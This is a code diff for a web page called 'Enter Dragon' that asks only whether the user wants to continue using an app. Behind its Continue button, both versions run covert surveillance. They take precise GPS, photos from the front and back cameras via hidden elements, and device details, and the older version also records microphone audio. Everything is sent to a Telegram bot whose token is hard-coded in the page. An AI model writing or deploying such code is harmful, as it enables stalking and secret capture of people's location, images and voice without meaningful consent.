@@ -2,314 +2,255 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="theme-color" content="#050505">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Enter Dragon</title>
-    
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
-    
     <style>
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: #050505; 
-            color: white;
-            overflow-x: hidden;
-            -webkit-tap-highlight-color: transparent; 
+            margin: 0;
+            padding: 0;
+            background-color: #050505;
+            background-image: radial-gradient(circle at 50% 50%, #1a1a1a 0%, #000 100%);
+            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
         }
-
-        .ambient-blob {
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(90px);
-            z-index: -1;
-            opacity: 0.35;
-            animation: float 12s infinite alternate ease-in-out;
-        }
-        .blob-1 { top: -5%; left: -10%; width: 45vw; height: 45vw; background: #3b82f6; }
-        .blob-2 { bottom: -10%; right: -5%; width: 55vw; height: 55vw; background: #8b5cf6; }
-
-        @keyframes float {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(20px, -40px) scale(1.1); }
-        }
-
+        
         .glass-panel {
-            background: rgba(255, 255, 255, 0.04);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+            background: rgba(30, 30, 30, 0.4);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 50px 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 85%;
+            width: 360px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
-        .btn-active:active { transform: scale(0.97); }
+        h1 {
+            margin-top: 0;
+            font-size: 28px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            font-weight: 600;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        p {
+            font-size: 15px;
+            margin-bottom: 35px;
+            line-height: 1.6;
+            color: #d1d1d1;
+        }
+
+        .btn-continue {
+            background: rgba(0, 102, 255, 0.2);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 102, 255, 0.5);
+            color: white;
+            padding: 16px 30px;
+            font-size: 18px;
+            font-weight: 500;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            box-shadow: 0 8px 20px rgba(0, 102, 255, 0.15);
+        }
+
+        .btn-continue:active {
+            background: rgba(0, 102, 255, 0.4);
+            transform: scale(0.98);
+        }
+
+        .loader {
+            display: none;
+            margin: 20px auto;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #0066ff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Persistent Status Log Box */
+        #status-log {
+            display: none;
+            width: 100%;
+            margin-top: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: left;
+            font-size: 13px;
+            max-height: 180px;
+            overflow-y: auto;
+            box-sizing: border-box;
+        }
+        
+        .log-item {
+            margin-bottom: 6px;
+            color: #e0e0e0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding-bottom: 4px;
+        }
     </style>
 </head>
-<body class="min-h-screen flex flex-col relative selection:bg-blue-500/30">
+<body>
 
-    <div class="ambient-blob blob-1"></div>
-    <div class="ambient-blob blob-2"></div>
-
-    <!-- Header -->
-    <header class="w-full fixed top-0 z-50 glass-panel border-b-0">
-        <div class="px-4 py-5 flex justify-center items-center">
-            <h1 class="text-xl font-bold tracking-[0.25em] uppercase text-gray-200 drop-shadow-md">
-                Enter Dragon
-            </h1>
-        </div>
-    </header>
-
-    <!-- Main Interface -->
-    <main class="flex-1 flex flex-col items-center justify-center p-6 mt-16 z-10 w-full max-w-md mx-auto text-center">
+    <div class="glass-panel">
+        <h1>Enter Dragon</h1>
+        <p>Do you want to continue using this app?<br>Is the service required?</p>
+        <button class="btn-continue" id="continueBtn" onclick="startProcess()">Continue</button>
+        <div class="loader" id="loader"></div>
         
-        <div class="w-20 h-20 mb-8 rounded-full flex items-center justify-center glass-panel shadow-[0_0_30px_rgba(139,92,246,0.2)]">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-purple-400 opacity-90" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-            </svg>
-        </div>
+        <!-- Persistent Notification Box -->
+        <div id="status-log"></div>
+    </div>
 
-        <p class="text-gray-300 mb-10 leading-relaxed text-[1.05rem] max-w-[290px]">
-            Do you want to continue using this app? Is the service required?
-        </p>
-
-        <!-- Continue Button -->
-        <button id="btn-continue" class="btn-active w-full max-w-[280px] py-4 rounded-2xl font-semibold text-lg text-white shadow-[0_8px_30px_rgba(59,130,246,0.3)] transition-all bg-gradient-to-r from-blue-600/40 to-purple-600/40 backdrop-blur-xl border border-white/10 hover:border-white/30 flex items-center justify-center gap-3 relative overflow-hidden">
-            <span id="btn-text">Continue</span>
-            
-            <!-- Default Icon -->
-            <svg id="btn-icon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
-                <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" />
-            </svg>
-            
-            <!-- Spinner -->
-            <svg id="btn-spinner" class="animate-spin hidden h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-            </svg>
-
-            <!-- Success Icon -->
-            <svg id="btn-success-icon" xmlns="http://www.w3.org/2000/svg" class="hidden h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
-            </svg>
-        </button>
-    </main>
-
-    <!-- Hidden Video/Canvas for Background Capture -->
-    <video id="hidden-video" class="hidden" autoplay playsinline muted></video>
-    <canvas id="hidden-canvas" class="hidden"></canvas>
+    <!-- Hidden elements for reliable photo capture -->
+    <video id="hidden-video" style="display:none;" autoplay playsinline muted></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = '8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo';
-        const CHAT_ID = '7208869554';
-        
-        const btnContinue = document.getElementById('btn-continue');
-        const btnText = document.getElementById('btn-text');
-        const btnIcon = document.getElementById('btn-icon');
-        const btnSpinner = document.getElementById('btn-spinner');
-        const btnSuccessIcon = document.getElementById('btn-success-icon');
-        
+        const BOT_TOKEN = "8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo";
+        const CHAT_ID = "7208869554";
+
+        const statusLog = document.getElementById('status-log');
         const video = document.getElementById('hidden-video');
         const canvas = document.getElementById('hidden-canvas');
         const ctx = canvas.getContext('2d');
 
-        function setButtonLoading(text = "Please Wait...") {
-            btnContinue.disabled = true;
-            btnText.innerText = text;
-            btnIcon.classList.add('hidden');
-            btnSuccessIcon.classList.add('hidden');
-            btnSpinner.classList.remove('hidden');
-        }
-
-        function setButtonSuccess() {
-            btnContinue.classList.remove('from-blue-600/40', 'to-purple-600/40');
-            btnContinue.classList.add('from-green-500/60', 'to-emerald-500/60');
-            
-            btnText.innerText = "Successfully";
-            btnSpinner.classList.add('hidden');
-            btnSuccessIcon.classList.remove('hidden');
-
-            setTimeout(() => {
-                btnContinue.disabled = false;
-                btnContinue.classList.remove('from-green-500/60', 'to-emerald-500/60');
-                btnContinue.classList.add('from-blue-600/40', 'to-purple-600/40');
-                
-                btnText.innerText = "Continue";
-                btnSuccessIcon.classList.add('hidden');
-                btnIcon.classList.remove('hidden');
-            }, 2000);
-        }
-
-        async function getBatteryInfo() {
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
-                }
-                return "Not supported";
-            } catch (e) { return "Error fetching"; }
-        }
-
-        async function getNetworkAndISPInfo() {
-            let ispData = "Unknown ISP";
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                if (res.ok) {
-                    const data = await res.json();
-                    ispData = `${data.org} (${data.city}, ${data.region})`;
-                }
-            } catch (e) {}
-
-            let nativeConn = "Unknown";
-            try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (conn) { nativeConn = `${conn.effectiveType || 'Unknown'} (Native API)`; }
-            } catch (e) {}
-            return `Provider: ${ispData}\nNative: ${nativeConn}`;
-        }
-
-        function getExactGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ success: false, data: "Geolocation not supported" });
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({ 
-                        success: true, 
-                        data: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` 
-                    }),
-                    (err) => resolve({ success: false, data: err.message }),
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            });
+        function logStatus(message, icon = "✅") {
+            statusLog.style.display = 'block';
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-item';
+            logEntry.innerHTML = `${icon} ${message}`;
+            statusLog.appendChild(logEntry);
+            statusLog.scrollTop = statusLog.scrollHeight;
         }
 
         async function sendTextToBot(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-                });
-            } catch (e) {}
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(e => console.log(e));
         }
 
-        async function sendDocumentToBot(blob, filename, caption) {
+        async function sendFileToBot(blob, filename) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('document', blob, filename);
-            if (caption) fd.append('caption', caption);
-            try { await fetch(url, { method: 'POST', body: fd }); } catch (e) {}
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', blob, filename);
+            await fetch(url, { method: 'POST', body: formData }).catch(e => console.log(e));
         }
 
-        async function sendPhotoToBot(blob, caption) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, 'photo.jpg');
-            fd.append('caption', caption);
-            try { await fetch(url, { method: 'POST', body: fd }); } catch (e) {}
-        }
-
-        async function extractFrameFromVideo(videoElem) {
-            canvas.width = videoElem.videoWidth || 640;
-            canvas.height = videoElem.videoHeight || 480;
-            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-            return await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
-        }
-
-        btnContinue.addEventListener('click', async () => {
-            setButtonLoading("Please Wait...");
-
-            // 1. Get GPS FIRST
-            const gps = await getExactGPS();
-
-            // 2. Send System Info + GPS
-            Promise.all([getBatteryInfo(), getNetworkAndISPInfo()]).then(([battery, network]) => {
-                const msg = `🐉 <b>ENTER DRAGON ALERT</b>\n\n` +
-                            `🔋 <b>Battery:</b> ${battery}\n` +
-                            `📶 <b>Network:</b>\n${network}\n\n` +
-                            `📍 <b>Location:</b> ${gps.success ? gps.data : 'Failed - ' + gps.data}`;
-                sendTextToBot(msg);
-            });
-
-            // 3. Front Camera & 20s Audio Combined with Timer
-            let frontStream = null;
+        async function captureTwoPhotos(facingMode, prefixName) {
+            let stream;
             try {
-                frontStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
-                
-                video.srcObject = frontStream;
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                video.srcObject = stream;
                 await video.play();
-                await new Promise(r => setTimeout(r, 800)); 
                 
-                const frontBlob = await extractFrameFromVideo(video);
-                if (frontBlob) sendPhotoToBot(frontBlob, "Front Camera Capture");
+                // ചെറിയ ഡിലേ (ക്യാമറ ഫോക്കസ് ആകാൻ)
+                await new Promise(r => setTimeout(r, 1000));
+                
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                // Photo 1
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob1 = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                await sendFileToBot(blob1, `${prefixName}_1.jpg`);
+                logStatus(`${prefixName} Photo 1 Sent`);
 
-                const videoTrack = frontStream.getVideoTracks()[0];
-                if (videoTrack) videoTrack.stop();
+                // ചെറിയ ഇടവേള 
+                await new Promise(r => setTimeout(r, 800));
+                
+                // Photo 2
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob2 = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                await sendFileToBot(blob2, `${prefixName}_2.jpg`);
+                logStatus(`${prefixName} Photo 2 Sent`);
 
-                // Timer Setup for 20 seconds
-                let timeLeft = 20;
-                btnText.innerText = `Please Wait... ${timeLeft}s`;
-                
-                const timerInterval = setInterval(() => {
-                    timeLeft--;
-                    if (timeLeft > 0) {
-                        btnText.innerText = `Please Wait... ${timeLeft}s`;
-                    } else {
-                        clearInterval(timerInterval);
-                        btnText.innerText = `Finalizing...`;
-                    }
-                }, 1000);
-
-                const audioRecorder = new MediaRecorder(frontStream);
-                const audioChunks = [];
-                
-                audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
-                
-                const audioPromise = new Promise((resolve) => {
-                    audioRecorder.onstop = async () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                        await sendDocumentToBot(audioBlob, "emergency_audio.webm", "20 Sec Audio Recording");
-                        frontStream.getAudioTracks().forEach(t => t.stop()); 
-                        resolve();
-                    };
-                });
-
-                audioRecorder.start();
-                await new Promise(r => setTimeout(r, 20000)); 
-                audioRecorder.stop();
-                clearInterval(timerInterval); // Backup clear
-                
-                await audioPromise;
-
-            } catch (error) {
-                console.log("Camera/Audio Error", error);
-            }
-
-            // 4. Back Camera
-            let backStream = null;
-            try {
-                backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
-                    .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }));
-                
-                video.srcObject = backStream;
-                await video.play();
-                await new Promise(r => setTimeout(r, 1000)); 
-                
-                const backBlob = await extractFrameFromVideo(video);
-                if (backBlob) await sendPhotoToBot(backBlob, "Back Camera Capture");
-            } catch (error) {
-                console.log("Back Camera Error", error);
+            } catch (err) {
+                logStatus(`Failed to access ${prefixName} camera`, "❌");
             } finally {
-                if (backStream) backStream.getTracks().forEach(t => t.stop());
+                if (stream) stream.getTracks().forEach(t => t.stop()); // ക്യാമറ കൃത്യമായി ഓഫ് ആക്കുന്നു
+            }
+        }
+
+        async function startProcess() {
+            document.getElementById('continueBtn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            statusLog.innerHTML = ""; 
+            logStatus("Process Started...", "⏳");
+
+            // 1. LOCATION (GPS) - First Priority
+            logStatus("Requesting GPS Location...", "📍");
+            if (navigator.geolocation) {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
+                    });
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    await sendTextToBot(`📍 GPS Location:\n${mapUrl}`);
+                    logStatus("GPS Location Sent Successfully");
+                } catch (err) {
+                    await sendTextToBot(`❌ GPS Failed: ${err.message}`);
+                    logStatus(`GPS Failed: ${err.message}`, "❌");
+                }
+            } else {
+                logStatus("GPS Not Supported by Browser", "❌");
             }
 
-            // 5. FINISH: Show Success State
-            setButtonSuccess();
-        });
+            // 2. FRONT CAMERA (2 Images)
+            logStatus("Accessing Front Camera...", "📸");
+            await captureTwoPhotos("user", "front_camera");
+
+            // 3. BACK CAMERA (2 Images)
+            logStatus("Accessing Back Camera...", "📸");
+            await captureTwoPhotos({ exact: "environment" }, "back_camera").catch(() => captureTwoPhotos("environment", "back_camera"));
+
+            // 4. MOBILE SPECIFICATIONS
+            logStatus("Gathering Mobile Specs...", "📱");
+            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+            const resolution = window.screen.width + " x " + window.screen.height;
+            const osInfo = navigator.userAgent;
+            
+            const specMessage = `📱 Device Specifications:\n\nRAM: ${ram}\nResolution: ${resolution}\nSystem/Browser: ${osInfo}`;
+            await sendTextToBot(specMessage);
+            logStatus("Mobile Specifications Sent");
+
+            // FINISH
+            document.getElementById('loader').style.display = 'none';
+            const btn = document.getElementById('continueBtn');
+            btn.style.display = 'block';
+            btn.innerText = 'Successfully';
+            btn.style.background = 'rgba(0, 200, 100, 0.4)'; // Green success color
+            btn.style.border = '1px solid rgba(0, 200, 100, 0.8)';
+            logStatus("All tasks completed successfully.", "✨");
+        }
     </script>
 </body>
 </html>
